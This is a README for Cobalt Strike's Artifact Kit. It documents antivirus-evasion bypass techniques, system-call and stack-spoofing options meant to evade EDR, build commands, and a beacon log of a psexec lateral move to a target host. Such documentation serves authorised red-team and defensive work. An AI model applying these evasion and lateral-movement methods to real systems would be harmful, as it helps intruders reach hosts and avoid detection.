# Artifact Kit

This package contains source code for Cobalt Strike's Artifact Kit. This kit
is designed to ease the development of antivirus safe artifacts.

Cobalt Strike uses artifacts from this kit to generate executables and DLLs
that are safe from some antivirus products. Load the included artifacts.cna
script to force Cobalt Strike to use your artifacts over the built-in ones.

Cobalt Strike uses these artifacts in the following places:

- Attacks -> Packages -> Windows Executable
- Attacks -> Packages -> Windows Executable (S)
- Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)
- Beacon's 'elevate svc-exe' command
- Beacon's 'jump psexec' and 'jump psexec64' commands

#### Support for artifact kit settings 
The artifact kit has implemented a new alias 'ak-settings' to support the
ability to modify the following settings:

- service - Modify the service name that is returned from the PSEXEC_SERVICE hook
- spawnto_x86 - Modify the process used for migration by the SERVICE EXE artifact.
- spawnto_x64 - Modify the process used for migration by the SERVICE EXE artifact.

The spawnto_x86 and spawnto_x64 settings will attempt to initialize with the 
.post-ex.spawnto_[x86|x64] settings in the Malleable C2 profile, however there
are some conditions that need to be met.  When those conditions occur a valid
default value will be used.  The settings do not support values longer than 63
characters, empty value, and environment variable substitutions.

In previous versions of the artifact kit these settings could have been updated
in the source code and then rebuild the artifact kit.  Now with the 'ak-settings'
command an operator can modify these settings as needed to generate an artifact.

Example:
```
03/31 11:14:13 beacon> ak-settings
03/31 11:14:13 [*] artifact kit settings:
03/31 11:14:13 [*]    service     = 'updatesvc'
03/31 11:14:13 [*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
03/31 11:14:13 [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
03/31 11:16:02 beacon> ak-settings service timesvc
03/31 11:16:02 [*] Updating the psexec service name to 'timesvc'
03/31 11:16:02 [*] artifact kit settings:
03/31 11:16:02 [*]    service     = 'timesvc'
03/31 11:16:02 [*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
03/31 11:16:02 [*]    spawnto_x64 = 'C:\Windows\System32\svchost.exe'
03/31 11:18:45 beacon> jump psexec64 TARGET smb
03/31 11:18:45 [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\xyz) on TARGET via Service Control Manager (\\TARGET\ADMIN$\timesvc.exe)
03/31 11:18:49 [+] host called home, sent: 295101 bytes
03/31 11:18:52 [+] received output:
Started service timesvc on TARGET
03/31 11:18:52 [+] established link to child beacon: 111.22.333.444
```
You will notice that the new beacon will be running under the process 'svchost.exe'.

# How it Works

Most antivirus products use signatures to detect known malware. To defeat
packers and crypters these products use a virtual machine sandbox to step 
through a binary and check each step against the database of known signatures.
The A/V sandboxes do not emulate all possible things a program can do. Artifact
Kit binaries force shellcode through a process that many A/V engines can not
emulate. This causes the A/V engine to give up on processing the artifact.

### dist-mailslot/ (implemented in src-common/bypass-mailslot.c)
```
This bypass creates a mailslot to serve the obfuscated shellcode and a client
to read it. Once the client reads the obfuscated shellcode it decodes it.

This technique is from the Season 5 Episode 8 session by Mr. Un1k0d3r
https://mr.un1k0d3r.com/portal/index.php
```

### dist-peek/ (implemented in src-common/bypass-peek.c)
```
This bypass technique is from Facts and myths about antivirus evasion with
Metasploit by mihi (@mihi42).
See the Antivirus Sandbox Evasion section at
http://schierlm.users.sourceforge.net/avevasion.html
```

### dist-pipe/ (implemented in src-common/bypass-pipe.c)
```
This bypass creates a named pipe to serve the obfuscated shellcode and a client
to read it. Once the client reads the obfuscated shellcode it decodes it. 
```

### dist-readfile/ (implemented in src-common/bypass-readfile.c):
```
This bypass opens the current artifact file, skips to where the shellcode is
stored, reads it, and decodes it. This is the default artifact kit loaded with
Cobalt Strike.
```

### dist-readfile-v2/ (implemented in src-common/bypass-readfile-v2.c):
```
This bypass opens the current artifact file, reads from the file, overwrite
what was read with the payload, and decodes it.
```

### dist-template/ (implemented in src-common/template.c):
```
This bypass technique will not get past any antivirus. It's a template.
```

## Integration with the User Defined Reflective Loader

The `stagesize` can be changed to accommodate the larger required space for
beacons that have used the `BEACON_RDLL_SIZE` hook for large custom reflective
loaders. The size specified must be equal/larger than the size of the payload
being patched into the selected artifact. The `stagesize` is set as a parameter
when building the kit.

The BEACON_RDLL_SIZE hook will return a value of 0, 5 or 100.  The value 5 will
use the 5K reflective loader and 100 will use the 100K reflective loader.
Depending on the Cobalt Strike version the value 0 has different results.

For 4.8 and earlier the value 0 will use the 5K reflective loader.

For 4.9 and later the value 0 will not include space for a reflective loader in
the beacon dll and is meant for use with prepended loaders (sRDI/Double Pulsar)
such as those found in the udrl-vs kit.  In this case the `stagesize` needs to
include the loader and beacon sizes, which likely will be larger than the 5kb size.

```
0KB User Defined Reflective Loader size = 344564
5KB User Defined Reflective Loader size = 344564
100KB User Defined Reflective Loader size = 486388
```

## Custom the binary resource

The binary metadata can be configured using the src-main/resource.c file. This
can be used to set file metadata, icons, etc. It is enabled as a parameter
when building the kit.

## Use system calls

The artifacts will use either the standard Windows API or one of the system
calls methods.  The SysWhispers3 public repository was used to generate the
code for the system calls with additional modification to work with the
artifact kit.

The system call method that is referenced as 'jumper' in the SysWhispers3
project will be referred to as 'indirect' in the arsenal kit to be consistent
with the Cobalt Strike terminology.  This affects the file names, build scripts
and documentation, however does not affect the code in the generated files.

You can choose between the following system call methods.

Method              |     Description
--------------------|----------------------------------------
none                | Use standard windows api functions.
embedded            | Use the embedded method.
indirect            | Use the indirect method.
indirect_randomized | Use the indirect randomized method.

The embedded method will likely be caught by antivirus products.

Credits:
 - https://github.com/klezVirus/SysWhispers3
 - https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams
 - https://github.com/helpsystems/nanodump

# Usage
```
./build.sh <techniques> <allocator> <stage size> <rdll size> <resource file>
           <stack spoof> <syscalls> <output directory>

Techniques       - a space separated list
Allocator        - set how to allocate memory for the reflective loader.
                   Valid values [HeapAlloc, VirtualAlloc, MapViewOfFile]
Stage Size       - integer used to set the space needed for the beacon stage.
                   For a 0K   RDLL stage size should be 344564 or larger
                   For a 5K   RDLL stage size should be 344564 or larger
                   For a 100K RDLL stage size should be 486388 or larger
RDLL Size        - integer used to specify the RDLL size. Valid values [0, 5, 100]
Resource File    - true or false to include the resource file
Stack Spoof      - true or false to use the stack spoofing technique
Syscalls         - set the system calls method
                   Valid values [none embedded indirect indirect_randomized]
Output Directory - Destination directory to save the output
```

Example: 
```
./build.sh "peek pipe readfile" HeapAlloc 344564 5 true true indirect /tmp/dist
```

You will need the following:

- Minimal GNU for Windows Cross-Compiler - apt-get install mingw-w64

# HOWTO - Add a New Bypass

1. Create a file in src-common/, name it bypass-[your technique here].c
2. ./build.sh [your technique here] HeapAlloc 361000 5 true true none /tmp/dist

# Thread Stack Spoofing

AV / EDR detections mechanisms have been improving over the years and
one specific technique that is used is thread stack inspection. This
technique determines the legitimacy of a process that is calling a
function or an API.

![Screenshot of stack dump](images/stack_dump.PNG)

The stack trace above shows addresses not mapped to any module. This
would determine this as a potential indicator for AV/EDR engines.

Some projects have been published like mgeeky’s
https://github.com/mgeeky/ThreadStackSpoofer, which has been shown to work.

As stated in the ThreadStackSpoofer documentation, the implementation
is effective, but it could be improved as for this case, return address
is invalidated (zeroed) right before Sleeping, and thus stack walking
can not be performed.

One mechanism that allows thread stack switching is Microsoft Fibers
https://docs.microsoft.com/en-us/windows/win32/procthread/fibers.

The Arsenal Kit has been updated to implement stack spoofing using the
Microsoft Fiber functions.  This technique does not invalidate the stack,
and exercises a normal code execution workflow, leveraging the stack
switching side effect of Microsoft Fibers.

![Screenshot of stack dump sp](images/stack_dump_sp.PNG)

Now scan the target using the project Hunt Sleeping Beacons by thefLink
https://github.com/thefLink/Hunt-Sleeping-Beacons

![Screenshot of hunt for sleeping beacons](images/hunt_sleep_beacons.PNG)


# How to use

In order to enable/disable the stack spoofing technique with the Arsenal Kit,
you should modify the arsenal_kit.config file.

1) set the artifactkit_stack_spoof setting to true (default) or false
2) Build the kits `build_arsenal_kit.sh`
3) Load the script - In Cobalt Strike -> Script Manager -> Load `dist/arsenal_kit.cna`
